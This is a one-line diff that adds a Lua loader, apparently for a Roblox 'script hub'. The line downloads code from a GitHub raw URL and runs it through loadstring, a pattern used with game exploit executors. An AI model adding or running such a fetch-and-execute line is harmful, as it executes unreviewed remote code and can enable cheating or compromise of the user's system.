@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MinionRoblox/Minion-Hub/main/Scripts%20from%20Minion"))()
